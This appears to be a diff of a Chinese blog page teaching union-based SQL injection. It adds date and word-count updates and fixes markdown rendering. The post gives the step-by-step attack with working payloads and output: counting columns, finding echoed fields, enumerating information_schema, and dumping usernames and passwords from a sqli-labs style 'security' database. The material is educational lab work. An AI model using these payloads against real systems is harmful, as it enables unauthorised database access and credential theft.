@@ -515,14 +515,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-03-07
+                    2021-03-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.6k
+                    2.5k
                 </div>
                 
 
@@ -554,8 +554,8 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>​        联合查询注入（<code>union query SQL injection</code>）是最常用的注入方式之一，同时也是最快速获取数据库中数据的注入方式。其原理是<font color="red">通过使用<code>union</code>联合两个或多个<code>select</code>语句并将联合查询之后的结果回显到页面中</font>。理论上满足<code>union</code>注入条件时，可以将用户有权限访问的所有数据库信息查询出来。</p>
-<h1 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h1><p>​        联合查询的语法规则如下所示，其直接结果是将两个<code>select</code>查询的结果放置在一张表中，其中第一个查询的结果在表中先显示，第二个查询的结果在表中后显示，操作结果如下图所示。</p>
+                <h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>联合查询注入（<code>union query SQL injection</code>）是最常用的注入方式之一，同时也是最快速获取数据库中数据的注入方式。其原理是<font color="red">通过使用<code>union</code>联合两个或多个<code>select</code>语句并将联合查询之后的结果回显到页面中</font>。理论上满足<code>union</code>注入条件时，可以将用户有权限访问的所有数据库信息查询出来。</p>
+<h1 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h1><p>联合查询的语法规则如下所示，其直接结果是将两个<code>select</code>查询的结果放置在一张表中，其中第一个查询的结果在表中先显示，第二个查询的结果在表中后显示，操作结果如下图所示。</p>
 <pre class=" language-mysql"><code class="language-mysql">-- 语法规则
 select ... union select ...
 
@@ -571,19 +571,22 @@ select id,username,password from users union select user(),database(),version();
 <li>进一步的信息查询需要具备相应的查询权限，权限过低可能会影响查询的结果</li>
 </ol>
 <h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><ol>
-<li><p><strong>第一步，先确定第一个查询的字段数量</strong>。</p>
-<p>​    使用<code>order/group by</code>语句，通过往后边拼接数字，可确定字段数量，<strong>若大于，则页面错误/无内容，若小于或等于，则页面正常</strong>。若错误页与正常页一样，先测试是否关键字被过滤（<code>union</code>直接爆字段数等），否则更换测试<code>报错注入/盲注</code>。</p>
-</li>
-<li><p><strong>第二步，判断结果在页面中的回显位置</strong>。</p>
-<p>​    使用<code>union select 1,2,3,4,x...</code> 我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。</p>
-<p>注意：</p>
+<li><strong>第一步，先确定第一个查询的字段数量</strong>。</li>
+</ol>
+<p>使用<code>order/group by</code>语句，通过往后边拼接数字，可确定字段数量，<strong>若大于，则页面错误/无内容，若小于或等于，则页面正常</strong>。若错误页与正常页一样，先测试是否关键字被过滤（<code>union</code>直接爆字段数等），否则更换测试<code>报错注入/盲注</code>。</p>
+<ol start="2">
+<li><strong>第二步，判断结果在页面中的回显位置</strong>。</li>
+</ol>
+<p>使用<code>union select 1,2,3,4,x...</code> 我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。</p>
+<p>   注意：</p>
 <ul>
 <li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，可以构造前边的<code>select</code>查询条件使其返回结果为空即可。</li>
 <li>注意一定要拼接足够的字段数，否则SQL语句报错。（此方法也可作为判断字段数的方法之一。)</li>
 </ul>
-</li>
-<li><p><strong>第三步，在显示的字段位置使用union来查询数据</strong>。</p>
-<p>​        首先，查询当前数据库名<code>database()</code>、数据库账号<code>user()</code>、数据库版本<code>version()</code>等基本情况，再根据不同的版本、不同的权限确定接下来的方法。</p>
+<ol start="3">
+<li><strong>第三步，在显示的字段位置使用union来查询数据</strong>。</li>
+</ol>
+<p>首先，查询当前数据库名<code>database()</code>、数据库账号<code>user()</code>、数据库版本<code>version()</code>等基本情况，再根据不同的版本、不同的权限确定接下来的方法。</p>
 <ul>
 <li><p>若<code>MySQL</code>版本<code>&lt;5.0</code></p>
 <p>简单的说，由于<code>mysql</code>的低版本缺乏系统库<strong>information_schema</strong>，故通常情况下，我们无法直接查询表名，字段（列）名等信息，这时候只能靠<strong>猜</strong>来解决。直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。</p>
@@ -624,53 +627,42 @@ select id,username,password from users where id = -1 union select 1,2,group_conc
 +----+----------+-------------------------------+
 |  1 | 2        | emails,referers,uagents,users |
 +----+----------+-------------------------------+</code></pre>
+<p>上述<code>payload</code>可查看全部的数据表名，其中<code>group_concat</code>函数将多行数据转成一行数据。</p>
+</li>
+<li><p>其次，通过其表名，查询该表的所有字段名（列名）。通过<strong>information_schema</strong>库下的<strong>columns</strong>表可查询对应的数据库/数据库表含有的字段名。</p>
+<pre class=" language-mysql"><code class="language-mysql">-- 当前数据库中的users表
+select id,username,password from users where id = -1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users';
+#此处的表名为字符串型，也通过十六进制表示
+-- 输出
++----+----------+----------------------+
+| id | username | password             |
++----+----------+----------------------+
+|  1 | 2        | id,username,password |
++----+----------+----------------------+
+
+-- security数据库中的user表
+select id,username,password from users where id = -1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users';
+-- 输出
++----+----------+----------------------+
+| id | username | password             |
++----+----------+----------------------+
+|  1 | 2        | id,username,password |
++----+----------+----------------------+</code></pre>
+</li>
+<li><p>知道了想要的数据存放的数据库、数据表、字段名，直接联合查询即可。</p>
+<pre class=" language-mysql"><code class="language-mysql">-- 查询security数据库的users表中指定字段值
+select id,username,password from users where id = -1 union select 1,username,password from security.users limit 0,1;
+-- 输出
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+</code></pre>
 </li>
 </ul>
 </li>
 </ul>
-</li>
-</ol>
-<pre><code> ​        上述`payload`可查看全部的数据表名，其中`group_concat`函数将多行数据转成一行数据。
-
- - 其次，通过其表名，查询该表的所有字段名（列名）。通过**information_schema**库下的**columns**表可查询对应的数据库/数据库表含有的字段名。
-
-   ```mysql
-   -- 当前数据库中的users表
-   select id,username,password from users where id = -1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;;
-   #此处的表名为字符串型，也通过十六进制表示
-   -- 输出
-   +----+----------+----------------------+
-   | id | username | password             |
-   +----+----------+----------------------+
-   |  1 | 2        | id,username,password |
-   +----+----------+----------------------+
-
-   -- security数据库中的user表
-   select id,username,password from users where id = -1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;;
-   -- 输出
-   +----+----------+----------------------+
-   | id | username | password             |
-   +----+----------+----------------------+
-   |  1 | 2        | id,username,password |
-   +----+----------+----------------------+
-   ```
-
-
-
- - 知道了想要的数据存放的数据库、数据表、字段名，直接联合查询即可。
-
-   ```mysql
-   -- 查询security数据库的users表中指定字段值
-   select id,username,password from users where id = -1 union select 1,username,password from security.users limit 0,1;
-   -- 输出
-   +----+----------+----------+
-   | id | username | password |
-   +----+----------+----------+
-   |  1 | Dumb     | Dumb     |
-   +----+----------+----------+
-   ```
-
- 简单的说，**查库名→查表名→查字段名→查数据**</code></pre><h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h1><h2 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h2><ul>
+<pre><code> 简单的说，**查库名→查表名→查字段名→查数据**</code></pre><h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h1><h2 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h2><ul>
 <li>服务器系统：<code>Windows Server 2008 R2</code></li>
 <li>脚本：<code>php-5.2.17nts</code></li>
 <li>中间件：<code>Apache-2.4.29</code></li>
@@ -1383,7 +1375,7 @@ http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-1/inde
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">299.5k</span>&nbsp;字
+                class="white-color">304.8k</span>&nbsp;字
             
             
             
